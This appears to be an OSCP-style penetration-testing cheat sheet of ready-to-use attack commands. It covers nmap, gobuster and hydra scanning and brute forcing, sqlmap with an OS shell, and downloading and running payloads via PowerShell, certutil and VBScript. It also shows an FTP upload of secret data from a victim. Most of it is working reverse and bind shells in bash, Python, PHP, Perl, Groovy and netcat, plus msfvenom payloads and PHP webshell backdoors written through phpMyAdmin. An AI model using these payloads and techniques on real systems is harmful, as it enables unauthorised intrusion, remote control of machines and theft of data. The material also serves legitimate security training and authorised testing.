

## Autorecon 




\-\-\- 


[https://github.com/Tib3rius/AutoRecon](#https://github.com/Tib3rius/AutoRecon)


autorecon \-vv 192\.168\.0\.1


## Enum4Linux 




\-\-\- 




### Scan Host 


enum4linux 192\.168\.0\.1


\-\-\- 




### Scan Host, Suppress Errors 


enum4linux 192\.168\.0\.1 |grep \-Ev '^\(Use of\)' \>enum4linux\.out 

## Gobuster 




\-\-\- 




### HTTP 





#### Fast Scan (Small List) 


gobuster dir \-e \-u http://192\.168\.0\.1 \-w /usr/share/wordlists/dirb/big\.txt \-t 20



#### Fast Scan (Big List) 


gobuster dir \-e \-u http://192\.168\.0\.1 \-w /usr/share/wordlists/dirbuster/directory\-list\-2\.3\-medium\.txt \-t 20



#### Slow Scan (Check File Extensions) 


gobuster dir \-e \-u http://192\.168\.0\.1 \-w /usr/share/wordlists/dirbuster/directory\-list\-2\.3\-medium\.txt \-x php,txt,html,cgi,sh,bak,aspx \-t 20


\-\-\- 




### HTTPS 



Set the \-\-insecuresslflag\.

## NFS 




\-\-\- 




### Show mountable drives 


showmount \-e 192\.168\.0\.1


\-\-\- 




### Mount Drive 


mkdir mpt
mount \-t nfs \-o soft 192\.168\.0\.1:/backup mpt/

## Nmap 




\-\-\- 




### Initial Fast TCP Scan 



nmap \-v \-sS \-sV \-Pn \-\-top\-ports 1000 \-oA initial\_scan\_192\.168\.0\.1 192\.168\.0\.1


\-\-\- 




### Full TCP Scan 


nmap \-v \-sS \-Pn \-sV \-p 0\-65535 \-oA full\_scan\_192\.168\.0\.1 192\.168\.0\.1


\-\-\- 




### Limited Full TCP Scan 


If the syn scan is taking very long to complete, the following command is an alternative \(no service detection\)\.
nmap \-sT \-p\- \-\-min\-rate 5000 \-\-max\-retries 1 192\.168\.0\.1


\-\-\- 




### Top 100 UDP Scan 


nmap \-v \-sU \-T4 \-Pn \-\-top\-ports 100 \-oA top\_100\_UDP\_192\.168\.0\.1 192\.168\.0\.1


\-\-\- 




### Full Vulnerability scan 


nmap \-v \-sS  \-Pn \-\-script vuln \-\-script\-args=unsafe=1 \-oA full\_vuln\_scan\_192\.168\.0\.1 192\.168\.0\.1


\-\-\- 




### Vulners Vulnerability Script 


nmap \-v \-sS  \-Pn \-\-script nmap\-vulners \-oA full\_vuln\_scan\_192\.168\.0\.1 192\.168\.0\.1


\-\-\- 




### SMB Vulnerabitlity Scan 


nmap \-v \-sS \-p 445,139 \-Pn \-\-script smb\-vuln\*\-\-script\-args=unsafe=1 \-oA smb\_vuln\_scan\_192\.168\.0\.1 192\.168\.0\.1

## SMBCLIENT 




\-\-\- 




### Fix Kali Default Installation 


To fix NT\_STATUS\_CONNECTION\_DISCONNECTED errors in new Kali installations add client min protocol = NT1 to your \\etc\\samba\\smb\.conf file\.


\-\-\- 




### List Shares (As Guest) 


smbclient \-U guest \-L 192\.168\.0\.1


\-\-\- 




### Connect to A Share (As User John) 


smbclient \\\\\\\\192\.168\.0\.1\\\\Users \-U c\.smith


\-\-\- 




### Download All Files From A Directory Recursively 


smbclient '\\\\server\\share' \-N \-c 'prompt OFF;recurse ON;cd 'path\\to\\directory\\';lcd '~/path/to/download/to/';mget \*'

example:
smbclient \\\\\\\\192\.168\.0\.1\\\\Data \-U John \-c 'prompt OFF;recurse ON;cd'\\Users\\John\\';lcd '/tmp/John';mget \*'


\-\-\- 




### Alternate File Streams 





#### List Streams 


smbclient \\\\\\\\192\.168\.0\.1\\\\Data \-U John \-c 'allinfo "\\Users\\John\\file\.txt"'



#### Download Stream By Name (:SECRET) 


smbclient \\\\\\\\192\.168\.0\.1\\\\Data \-U John

get "\\Users\\John\\file\.txt:SECRET:$DATA"


## SQLMAP 



**DISCLAIMER: 
There are a number of tools you are not allowed to use in your OSCP exam\. At the time of writing, sqlmap is one of them\. 
Check which tools are restricted/banned before you use them in your exam\. You can find detailed information about tool usage in the official exam guideline\.**


\-\-\- 




### Get Request  




#### Test All (Default Settings) 


sqlmap \-u "http://192\.168\.0\.1/database/inject\.php?q=user" \-\-batch



#### Test All (Default Settings, High Stress) 


sqlmap \-u "http://192\.168\.0\.1/database/inject\.php?q=user" \-\-batch \-\-level=5 \-\-risk=3


\-\-\- 




### Post Request (Capture with BURP) 





#### Test All (Default Settings) 


sqlmap \-\-all \-r post\_request\.txt \-\-batch



#### Test All (Default Settings, High Stress) 


sqlmap \-\-all \-r post\_request\.txt \-\-batch \-\-level=5 \-\-risk=3



#### Get A Reverse Shell (MySQL) 


sqlmap \-r post\_request\.txt \-\-dbms "mysql" \-\-os\-shell

## WebApp Paths 




\-\-\- 


[https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md](#https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md)


## Powershell 




\-\-\- 




### As Cmd.exe Command 


powershell \-ExecutionPolicy bypass \-noprofile \-c \(New\-Object System\.Net\.WebClient\)\.DownloadFile\('http://192\.168\.0\.1:80/winprivesc/JuicyPotato\.exe','C:\\Users\\john\\Desktop\\juicy\.exe'\)


\-\-\- 




### Encode Command for Transfer 


Very helpful for chars that need to be escaped otherwise\.

$Command = '\(new\-object System\.Net\.WebClient\)\.DownloadFile\("http://192\.168\.0\.1:80/ftp\.txt","C:\\Windows\\temp\\ftp\.txt"\)' 
$Encoded = \[convert\]::ToBase64String\(\[System\.Text\.encoding\]::Unicode\.GetBytes\($command\)\) 
powershell\.exe \-NoProfile \-encoded $Encoded


\-\-\- 



## Certutil 




\-\-\- 




### Download 


certutil\.exe \-urlcache \-f http://192\.168\.0\.1/shell\.exe C:\\Windows\\Temp\\shell\.exe


\-\-\- 




### Download & Execute Python Command 


os\.execute\('cmd\.exe /c certutil\.exe \-urlcache \-split \-f http://192\.168\.0\.1/shell\.exe C:\\Windows\\Temp\\shell\.exe \& C:\\Windows\\Temp\\shell\.exe'\)



## SMB 




\-\-\- 




### Start Impacket SMB Server (With SMB2 Support) 


impacket\-smbserver \-smb2support server\_name /var/www/html


\-\-\- 




### List Drives (Execute on Victim) 


net view \\\\192\.168\.0\.1


\-\-\- 




### Copy Files (Execute on Victim) 


copy \\\\192\.168\.0\.1\\server\_name\\shell\.exe shell\.exe

## PureFTP 




\-\-\- 




### Install 


apt\-get update \&\&apt\-get install pure\-ftpd



### Create setupftp.sh Execute The Script 


#\!/bin/bash
groupadd ftpgroup
useradd \-g ftpgroup \-d /dev/null \-s /etc ftpuser
pure\-pw useradd myftpuser \-u ftpuser \-d /ftphome
pure\-pw mkdb
cd/etc/pure\-ftpd/auth/
sudo ln \-s /etc/pure\-ftpd/conf/PureDB /etc/pure\-ftpd/auth/40PureDBexit
mkdir \-p /ftphome
chown \-R ftpuser:ftpgroup /ftphome/
/etc/init\.d/pure\-ftpd restart\./setupftp\.sh


\-\-\- 




### Get Service Ready 





#### Reset Password 


pure\-pw passwd offsec \-f /etc/pure\-ftpd/pureftpd\.passwd



#### Commit Changes 


pure\-pw mkdb



#### Restart Service 


/etc/init\.d/pure\-ftpd restart



#### Create FTP Script (On Victim 

\)
echoopen 192\.168\.0\.1\>\>ftp\.txt
echoUSER myftpuser\>\>ftp\.txt
echomypassword\>\>ftp\.txt
echobin\>\>ftp\.txt
echoput secret\_data\.txt\>\>ftp\.txt
echobye \>\>ftp\.txt



#### Exectue Script 

\(On Victim\)
ftp \-v \-n \-s:ftp\.txt

## Netcat 




\-\-\- 




### Receiving Shell 


nc \-l \-p 1234 \>out\.file


\-\-\- 




### Sending Shell 


nc \-w 3 192\.168\.0\.1 1234 \<out\.file

## TFTP 




\-\-\- 




### Start TFTP Daemon (Folder /var/tftp) 


atftpd \-\-daemon \-\-port 69 /var/tftp


\-\-\- 




### Transfer Files 


tftp \-i 192\.168\.0\.1 GET whoami\.exe

## VBScript 




\-\-\- 




### Create wget.vbs File 


echo strUrl = WScript\.Arguments\.Item\(0\) \> wget\.vbs
echo StrFile = WScript\.Arguments\.Item\(1\) \>\> wget\.vbs
echo Const HTTPREQUEST\_PROXYSETTING\_DEFAULT = 0 \>\> wget\.vbs
echo Const HTTPREQUEST\_PROXYSETTING\_PRECONFIG = 0 \>\> wget\.vbs
echo Const HTTPREQUEST\_PROXYSETTING\_DIRECT = 1 \>\> wget\.vbs
echo Const HTTPREQUEST\_PROXYSETTING\_PROXY = 2 \>\> wget\.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts \>\> wget\.vbs
echo Err\.Clear \>\> wget\.vbs
echo Set http = Nothing \>\> wget\.vbs
echo Set http = CreateObject\("WinHttp\.WinHttpRequest\.5\.1"\) \>\> wget\.vbs
echo If http Is Nothing Then Set http = CreateObject\("WinHttp\.WinHttpRequest"\) \>\> wget\.vbs
echo If http Is Nothing Then Set http = CreateObject\("MSXML2\.ServerXMLHTTP"\) \>\> wget\.vbs
echo If http Is Nothing Then Set http = CreateObject\("Microsoft\.XMLHTTP"\) \>\> wget\.vbs
echo http\.Open "GET",strURL,False \>\> wget\.vbs
echo http\.Send \>\> wget\.vbs
echo varByteArray = http\.ResponseBody \>\> wget\.vbs
echo Set http = Nothing \>\> wget\.vbs
echo Set fs = CreateObject\("Scripting\.FileSystemObject"\) \>\> wget\.vbs
echo Set ts = fs\.CreateTextFile\(StrFile,True\) \>\> wget\.vbs
echo strData = "" \>\> wget\.vbs
echo strBuffer = "" \>\> wget\.vbs
echo For lngCounter = 0 to UBound\(varByteArray\) \>\> wget\.vbs
echo ts\.Write Chr\(255 And Ascb\(Midb\(varByteArray,lngCounter \+ 1,1\)\)\) \>\> wget\.vbs
echo Next \>\> wget\.vbs
echo ts\.Close \>\> wget\.vbs


\-\-\- 




### Download Files 


cscript wget\.vbs http://192\.168\.0\.1/nc\.exe nc\.exe

## Hydra 




\-\-\- 




### HTTP Basic Authentication 


hydra \-l admin \-V \-P /usr/share/wordlists/rockyou\.txt \-s 80 \-f 192\.168\.0\.1 http\-get /phpmyadmin/ \-t 15


\-\-\- 




### HTTP Get Request 


hydra 192\.168\.0\.1 \-V \-L /usr/share/wordlists/user\.txt \-P /usr/share/wordlists/rockyou\.txt http\-get\-form "/login/:username=^USER^\&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" \-t 15


\-\-\- 




### HTTP Post Request 


Check request in BURP to see Post parameters\. \-l or \-L has to be set, even if there is no user to login with\!\. Use https\-post\-forminstead of http\-post\-formfor HTTPS sites\.

hydra \-l admin \-P /usr/share/wordlists/rockyou\.txt 192\.168\.0\.1 http\-post\-form "/webapp/login\.php:username=^USER^\&password=^PASS^:Invalid" \-t 15


\-\-\- 




### MYSQL 


Change MYDATABASENAME\. Default databasename is mysql\.

hydra \-L /usr/share/seclists/Usernames/top\-usernames\-shortlist\.txt \-P /usr/share/wordlists/rockyou\.txt \-vv  mysql://192\.168\.0\.1:3306/MYDATABASENAME \-t 15



## Upgrade Shell (TTY) 




\-\-\- 


python \-c 'import pty;pty\.spawn\("/bin/bash"\);' 


## Catching Reverse Shells (Netcat) 




\-\-\- 


rlwrap enables the usage of arrow keys in your shell\. [https://github.com/hanslub42/rlwrap](#https://github.com/hanslub42/rlwrap)


rlwrap nc \-nlvp 4444

### Enable Tab-Completion 




\-\-\- 


1\. In your active shell press bg to send your nc session to background
2\. Enter stty raw \-echo
3\. Enter fg to bring your nc session to foreground
4\. Enter export TERM=xterm\-256color


### Reverse Shell 




\-\-\- 




#### Unix 


nc 192\.168\.0\.1 4444 \-e /bin/bash

If \-eis not allowed, try to find other versions of netcat
/bin/nc
/usr/bin/ncat
/bin/netcat
/bin/nc\.traditional


\-\-\- 




#### Windows 


nc 192\.168\.0\.1 4444 \-e cmd\.exe

### Bind shell 




\-\-\- 




#### Unix 



Victim:
nc \-nlvp 4444 \-e /bin/bash

Attacker:
nc 192\.168\.0\.1 4444


\-\-\- 




#### Windows 



Victim:
nc \-nlvp 4444 \-e cmd\.exe

Attacker:
nc 192\.168\.0\.1 4444

## Bash 




\-\-\- 




### Reverse Shell 



/bin/bash \-i \>\&/dev/tcp/192\.168\.0\.1/4433 0\>\&1

## Python 




\-\-\- 




### Reverse Shell 



As Command:
python \-c 'import socket,subprocess,os;s=socket\.socket\(socket\.AF\_INET,socket\.SOCK\_STREAM\);s\.connect\(\("192\.168\.0\.1",4444\)\);os\.dup2\(s\.fileno\(\),0\); os\.dup2\(s\.fileno\(\),1\); os\.dup2\(s\.fileno\(\),2\);p=subprocess\.call\(\["/bin/sh","\-i"\]\);'

Python Code:
importsocket,subprocess,os
s=socket\.socket\(socket\.AF\_INET,socket\.SOCK\_STREAM\)
s\.connect\(\("192\.168\.0\.1",4444\)\);os\.dup2\(s\.fileno\(\),0\)
os\.dup2\(s\.fileno\(\),1\)
os\.dup2\(s\.fileno\(\),2\)
p=subprocess\.call\(\["/bin/sh","\-i"\]\)PHP

### Kali Default PHP Reverse Shell 




\-\-\- 


cat /usr/share/webshells/php/php\-reverse\-shell\.php

### Kali Default PHP CMD Shell 




\-\-\- 


cat /usr/share/webshells/php/php\-backdoor\.php

### CMD Shell 




\-\-\- 


\<?php echosystem\($\_REQUEST\["cmd"\]\);?\>

Call the CMD shell:
http://192\.168\.0\.1/cmd\_shell\.php?cmd=whoami

### WhiteWinterWolf Webshell 




\-\-\- 


[https://github.com/WhiteWinterWolf/wwwolf-php-webshell](#https://github.com/WhiteWinterWolf/wwwolf-php-webshell)



### PHP Reverse Shell 




\-\-\- 




#### Version 1 


\<?php echoshell\_exec\("/bin/bash \-i \>\& /dev/tcp/192\.168\.0\.1/4444 0\>\&1"\);?\>


\-\-\- 




#### Version 2 


\<?php $sock=fsockopen\("192\.168\.0\.1", 4444\);exec\("/bin/sh \-i \<\&3 \>\&3 2 \>\& 3"\);?\>


\-\-\- 




#### As Command 


php \-r '$sock=fsockopen\("192\.168\.0\.1",4444\);exec\("/bin/sh \-i \<\&3 \>\&3 2\>\&3"\);'

### Windows Binary (.exe) 




\-\-\- 




#### 32 Bit (x86) 



Reverse Shell:
msfvenom \-p windows/shell\_reverse\_tcp LHOST=192\.168\.0\.1 LPORT=4444 \-f exe \-o shell\.exe

Bind Shell:
msfvenom \-p windows/shell\_bind\_tcp LPORT=4444 \-f exe \-o bind\_shell\.exe

Output in Hex, C Style, Exclude bad chars, Exitfunction thread:
msfvenom \-p windows/shell\_bind\_tcp LHOST=192\.168\.0\.1 LPORT=4444 EXITFUNC=thread \-b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" \-f c \-a x86 \-\-platform windows


\-\-\- 




#### 64 Bit (x64) 



Reverse Shell:
msfvenom \-p windows/x64/shell\_reverse\_tcp LHOST=192\.168\.0\.1 LPORT=4444 \-f exe \-o shell\.exe

Bind Shell:
msfvenom \-p windows/x64/shell\_bind\_tcp LPORT=4444 \-f exe \-o bind\_shell\.exe

Meterpreter:
msfvenom \-p windows/x64/meterpreter\_reverse\_tcp LHOST=192\.168\.0\.1 LPORT=4444 \-f exe \-o shell\.exe

### Linux Binary (.elf) 




\-\-\- 




#### 32 Bit (x86) 



Reverse Shell:
msfvenom \-p linux/x86/shell\_reverse\_tcp LHOST=192\.168\.0\.1 LPORT=4444 \-f elf \>rev\_shell\.elf

Bind Shell:
msfvenom \-p linux/x86/shell/bind\_tcp  LHOST=192\.168\.0\.1 \-f elf \>bind\_shell\.elf


\-\-\- 




#### 64 Bit (x64) 



Reverse Shell:
msfvenom \-p linux/x64/shell\_reverse\_tcp LHOST=192\.168\.0\.1 LPORT=4444 \-f elf \>rev\_shell\.elf

Bind Shell:
msfvenom \-p linux/x64/shell/bind\_tcp LHOST=192\.168\.0\.1 \-f elf \>rev\_shell\.elf

### Java Server Pages (.jsp) 




\-\-\- 




#### Reverse Shell 



msfvenom \-p java/jsp\_shell\_reverse\_tcp LHOST192\.168\.0\.1 LPORT=4444 \-f raw \>shell\.jsp

### Active Sever Pages Extended (aspx) 




\-\-\- 




#### Reverse Shell 



msfvenom \-p windows/shell\_reverse\_tcp LHOST=192\.168\.0\.1 LPORT=4444 \-f aspx \-o rev\_shell\.aspx

### Active Sever Pages Extended (.aspx) 




\-\-\- 




### Transfer A File (Certutil) 


\<% 
Set rs = CreateObject\("WScript\.Shell"\)
Set cmd = rs\.Exec\("cmd /c certutil\.exe \-urlcache \-f http://192\.168\.0\.1/shell\.exe C:\\Windows\\Temp\\shell\.exe"\)
o = cmd\.StdOut\.Readall\(\)
Response\.write\(o\)
%\>


\-\-\- 




### Execute a File 


\<% 
Set rs = CreateObject\("WScript\.Shell"\)
Set cmd = rs\.Exec\("cmd /c C:\\Windows\\Temp\\shell\.exe"\)
o = cmd\.StdOut\.Readall\(\)
Response\.write\(o\)
%\>



## Jenkins / Groovy (Java) 




\-\-\- 




### Linux Reverse Shell 



String host="192\.168\.0\.1";
intport=4444;
String cmd="/bin/sh";
Process p=newProcessBuilder\(cmd\)\.redirectErrorStream\(true\)\.start\(\);Socket s=newSocket\(host,port\);InputStream pi=p\.getInputStream\(\),pe=p\.getErrorStream\(\), si=s\.getInputStream\(\);OutputStream po=p\.getOutputStream\(\),so=s\.getOutputStream\(\);while\(\!s\.isClosed\(\)\)\{while\(pi\.available\(\)\>0\)so\.write\(pi\.read\(\)\);while\(pe\.available\(\)\>0\)so\.write\(pe\.read\(\)\);while\(si\.available\(\)\>0\)po\.write\(si\.read\(\)\);so\.flush\(\);po\.flush\(\);Thread\.sleep\(50\);try\{p\.exitValue\(\);break;\}catch\(Exception e\)\{\}\};p\.destroy\(\);s\.close\(\);


\-\-\- 




### Windows Reverse Shell 



String host="192\.168\.0\.1";
intport=4444;
String cmd="cmd\.exe";
Process p=newProcessBuilder\(cmd\)\.redirectErrorStream\(true\)\.start\(\);Socket s=newSocket\(host,port\);InputStream pi=p\.getInputStream\(\),pe=p\.getErrorStream\(\), si=s\.getInputStream\(\);OutputStream po=p\.getOutputStream\(\),so=s\.getOutputStream\(\);while\(\!s\.isClosed\(\)\)\{while\(pi\.available\(\)\>0\)so\.write\(pi\.read\(\)\);while\(pe\.available\(\)\>0\)so\.write\(pe\.read\(\)\);while\(si\.available\(\)\>0\)po\.write\(si\.read\(\)\);so\.flush\(\);po\.flush\(\);Thread\.sleep\(50\);try\{p\.exitValue\(\);break;\}catch\(Exception e\)\{\}\};p\.destroy\(\);s\.close\(\);



## Perl 




\-\-\- 




### Reverse Shell 



perl \-MIO \-e'use Socket;$ip="192\.168\.0\.1";$port=4444;socket\(S,PF\_INET,SOCK\_STREAM,getprotobyname\("tcp"\)\);if\(connect\(S,sockaddr\_in\($port,inet\_aton\($ip\)\)\)\)\{open\(STDIN,"\>\&S"\);open\(STDOUT,"\>\&S"\);open\(STDERR,"\>\&S"\);exec\("/bin/sh \-i"\);\};'



## PhpmyAdmin  



\-\-\- 


Write a CMD shell into a file with the right permissions\. Issue the following select\. \(Try different paths for different webservers\)


\-\-\- 




### Windows 



SELECT"\<?php system\($\_GET\['cmd'\]\); ?\>" into outfile "C:\\\\xampp\\\\htdocs\\\\backdoor\.php"


\-\-\- 




### Unix 



SELECT"\<?php system\($\_GET\['cmd'\]\); ?\>" into outfile "/var/www/html/shell\.php"